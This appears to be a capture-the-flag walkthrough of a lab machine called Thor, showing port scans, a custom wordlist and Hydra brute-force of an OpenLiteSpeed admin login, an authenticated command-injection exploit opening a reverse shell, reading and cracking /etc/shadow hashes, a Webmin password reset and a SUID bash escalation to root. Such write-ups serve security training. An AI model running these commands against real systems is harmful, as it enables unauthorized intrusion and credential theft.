# Thor

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.201.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 11:13 +08
Nmap scan report for 192.168.201.208
Host is up (0.17s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
7080/tcp  open  empowerid
10000/tcp open  snet-sensor-mgmt
```

Did a detailed scan on the open web ports.&#x20;

```
$ sudo nmap -p 80,7080,10000 -sC -sV --min-rate 3000 -Pn 192.168.201.208
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 11:16 +08
Nmap scan report for 192.168.201.208
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          LiteSpeed
|_http-server-header: LiteSpeed
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     etag: "85e2-604fc846-26fe7;;;"
|     last-modified: Mon, 15 Mar 2021 20:49:10 GMT
|     content-type: text/html
|     content-length: 34274
|     accept-ranges: bytes
|     date: Sat, 15 Jul 2023 03:16:12 GMT
|     server: LiteSpeed
|     connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <!--====== Required meta tags ======-->
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <!--====== Title ======-->
|     <title>Jane Foster - Personal Portfolio</title>
|     <!--====== Favicon Icon ======-->
|     <link rel="shortcut icon" href="assets/images/favicon.png" type="image/png">
|     <!--====== Bootstrap css ======-->
|     <link rel="stylesheet" href="assets/css/bootstrap.min.css">
|     <!--====== Line Icons css ======-->
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     etag: "85e2-604fc846-26fe7;;;"
|     last-modified: Mon, 15 Mar 2021 20:49:10 GMT
|     content-type: text/html
|     content-length: 34274
|     accept-ranges: bytes
|     date: Sat, 15 Jul 2023 03:16:13 GMT
|     server: LiteSpeed
|     connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <!--====== Required meta tags ======-->
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <!--====== Title ======-->
|     <title>Jane Foster - Personal Portfolio</title>
|     <!--====== Favicon Icon ======-->
|     <link rel="shortcut icon" href="assets/images/favicon.png" type="image/png">
|     <!--====== Bootstrap css ======-->
|     <link rel="stylesheet" href="assets/css/bootstrap.min.css">
|_    <!--====== Line Icons css ======-->
|_http-title: Jane Foster - Personal Portfolio
7080/tcp  open  ssl/empowerid LiteSpeed
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
| ssl-cert: Subject: commonName=ubuntu/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2022-06-07T09:39:58
|_Not valid after:  2024-09-04T09:39:58
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 302 Found
|     x-powered-by: PHP/5.6.36
|     x-frame-options: SAMEORIGIN
|     x-xss-protection: 1;mode=block
|     referrer-policy: same-origin
|     x-content-type-options: nosniff
|     set-cookie: LSUI37FE0C43B84483E0=6bde28c9fc90fbd8dbd0956db348c0f6; path=/; secure; HttpOnly
|     expires: Thu, 19 Nov 1981 08:52:00 GMT
|     cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
|     pragma: no-cache
|     set-cookie: LSID37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSPA37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSUI37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     location: /login.php
|     content-type: text/html; charset=UTF-8
|     content-length: 0
|     date: Sat, 15 Jul 2023 03:16:30 GMT
|     server: LiteSpeed
|     alt-svc: quic=":7080"; ma=2592000; v="43,46", h3-Q043=":7080";
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     x-powered-by: PHP/5.6.36
|     x-frame-options: SAMEORIGIN
|     x-xss-protection: 1;mode=block
|     referrer-policy: same-origin
|     x-content-type-options: nosniff
|     set-cookie: LSUI37FE0C43B84483E0=58c6a8490e64410d0e090353ed826ba0; path=/; secure; HttpOnly
|     expires: Thu, 19 Nov 1981 08:52:00 GMT
|     cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
|     pragma: no-cache
|     set-cookie: LSID37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSPA37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSUI37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     location: /login.php
|     content-type: text/html; charset=UTF-8
|     content-length: 0
|     date: Sat, 15 Jul 2023 03:16:31 GMT
|     server: LiteSpeed
|_    alt-svc: quic=":7080"; ma=2592000; v="43,46", h3-Q043=":7080";
| http-title: LiteSpeed WebAdmin Console
|_Requested resource was /login.php
|_http-server-header: LiteSpeed
10000/tcp open  http          MiniServ 1.962 (Webmin httpd)
|_http-server-header: MiniServ/1.962
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
```

### Wordlist + Brute Force -> Creds + RCE

Port 80 hosted a portfolio page for Jane Foster:

<figure><img src="../../../.gitbook/assets/image (1541).png" alt=""><figcaption></figcaption></figure>

At the bottom of the page, there was some contact details:

<figure><img src="../../../.gitbook/assets/image (1539).png" alt=""><figcaption></figcaption></figure>

The box was named Thor, so it makes sense that there would be something 'Thor' related. From the earlier `nmap` scan, we know that port 80 is running using Litespeed. Port 7080 is the LiteSpeed admin console, likely operated by this Jane Foster.&#x20;

Port 7080 reveals a login page:

<figure><img src="../../../.gitbook/assets/image (3175).png" alt=""><figcaption></figcaption></figure>

There are some exploits available for this:

```
$ searchsploit openlitespeed
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
OpenLitespeed 1.3.9 - Use-After-Free (Denial of Service)   | linux/dos/37051.c
Openlitespeed 1.7.9 - 'Notes' Stored Cross-Site Scripting  | multiple/webapps/49727.txt
Openlitespeed Web Server 1.7.8 - Command Injection (Authen | multiple/webapps/49483.txt
Openlitespeed WebServer 1.7.8 - Command Injection (Authent | multiple/webapps/49556.py
----------------------------------------------------------- ---------------------------------
```

One of which is an RCE exploit, but it requires credentials. Weak credentials don't work here, so we need to get crafty. We know that 'Jane Foster' is the one operating this webpage. So let's create a custom wordlist present.&#x20;

```
$ cewl http://192.168.201.208 -d 5 --with-numbers > wordlist
```

I tried to use Hydra to brute force this, but it didn't work either. I took a hint and it told me to keep brute forcing, so in this case we can try the permutation of words within our `wordlist` file.&#x20;

```python
import itertools

filename = 'wordlist'
permutations = []

with open(filename, 'r') as file:
    wordlist = [line.strip() for line in file]

for combination in itertools.permutations(wordlist, 2):
    permutation = ''.join(combination)
    print(permutation)
```

This would combine two of the words together. Then, we can brute force again with Hydra.&#x20;

```
$ hydra -l admin -P permutated.txt -s 7080 -t 64 192.168.201.208 https-post-form "/login.php:userid=admin&pass=^PASS^:Invalid credential" -v
[7080][http-post-form] host: 192.168.201.208   login: admin   password: Foster2020
```

This would find the correct password. We can then use the RCE exploit:

```
$ python3 49556.py 192.168.201.208:7080 admin Foster2020 shadow
[+] Authentication was successful!
[+] Version is detected: OpenLiteSpeed 1.7.8
[+] The target is vulnerable!
[+] tk value is obtained: 0.51264900 1689392604
[+] Sending reverse shell to 127.0.0.1:4444 ...
[+] Triggering command execution..
```

<figure><img src="../../../.gitbook/assets/image (3147).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Shadow Group -> Thor Creds

We are part of the `shadow` group, meaning we can read `/etc/shadow`:

{% code overflow="wrap" %}
```
$ cat /etc/shadow
root:$6$XRJJB9j7GYzWvjBy$yZEsOS3cam1DG.eI26bW1TERw5SV7b3RVZQHZB7UFzKNyPR6PPUFfxzclKsiGUT8.WoL7vQ4hhNmekav68kwN1:19150:0:99999:7:::
thor:$6$l2ThCEsvmrzmkKIA$FWtAb1SsYFqAXA96Ze4uGTHtPV9HNi7ShAgoTet1gx.HvkEFePp.Bk/uBeuxpCMz/X3jXWbGavj11po9H/FzP.:19150:0:99999:7:::
```
{% endcode %}

We can try to crack the hashes alone using `john` for these users. The hash for `thor` can be cracked while the one for `root` cannot.&#x20;

```
$ john --show hashes                                     
?:valkyrie

1 password hash cracked, 1 left
```

We can then `ssh` in as `thor`:

<figure><img src="../../../.gitbook/assets/image (1066).png" alt=""><figcaption></figcaption></figure>

### Sudo Webmin -> Webmin RCE

`thor` can restart the Webmin instance as `root`:

```
thor@Lite:~$ sudo -l
Matching Defaults entries for thor on lite:                                                  
    env_reset, mail_badpass,                                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
                                                                                             
User thor may run the following commands on lite:                                            
    (root) NOPASSWD: /usr/bin/systemctl restart webmin
```

I almost forgot there was a Webmin instance.&#x20;

```
thor@Lite:~$ ps -elf | grep webmin
1 S root        1202       1  0  80   0 -  9474 -      03:13 ?        00:00:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
0 S thor       13415   13303  0  80   0 -  1608 pipe_w 03:51 pts/0    00:00:00 grep --color=auto webmin
```

Using our access, we can actually reset the Webmin password.

{% embed url="https://linuxconfig.net/manuals/howto/how-to-reset-webmin-password.html" %}

However, it appears that only the `bin` group has access to the `/etc/webmin` group:

```
thor@Lite:~$ ls -la /etc/webmin/
total 536                                                                                    
drwxr-xr-x 116 root root 4096 Jun  7  2022 .                                                 
drwxr-xr-x 101 root root 4096 Jul 15 03:43 ..                                                
drwx--x--x   2 root bin  4096 Jun  7  2022 acl
drwx--x--x   2 root bin  4096 Jun  7  2022 adsl-client
drwx--x--x   2 root bin  4096 Jun  7  2022 ajaxterm
<TRUNCATED>
```

Earlier, the RCE exploit for OpenLiteSpeed required us to specify a GroupID, of which I specified `shadow` as the default. We can try specifying bin and using that shell to reset the password.

```
$ python3 49556.py 192.168.201.208:7080 admin Foster2020 bin   
[+] Authentication was successful!
[+] Version is detected: OpenLiteSpeed 1.7.8
[+] The target is vulnerable!
[+] tk value is obtained: 0.02467200 1689393257
[+] Sending reverse shell to 127.0.0.1:4444 ...
[+] Triggering command execution...
```

<figure><img src="../../../.gitbook/assets/image (3087).png" alt=""><figcaption></figcaption></figure>

Then we can reset the password and restart Webmin as `thor`:

```
nobody@Lite:/usr/bin$ /usr/share/webmin/changepass.pl /etc/webmin root toor
Updated password of Webmin user root
Webmin is not running - cannot refresh configuration

thor@Lite:~$ sudo /usr/bin/systemctl restart webmin
```

Using this, we can login to Webmin and view the dashboard:

<figure><img src="../../../.gitbook/assets/image (1544).png" alt=""><figcaption></figcaption></figure>

Within Webmin, there's a `>_` option, which spawns a command line instance within the browser:

<figure><img src="../../../.gitbook/assets/image (2072).png" alt=""><figcaption></figcaption></figure>

We can just do `chmod u+s /bin/bash`, and get a proper `root` shell using `ssh`.

<figure><img src="../../../.gitbook/assets/image (3086).png" alt=""><figcaption></figcaption></figure>
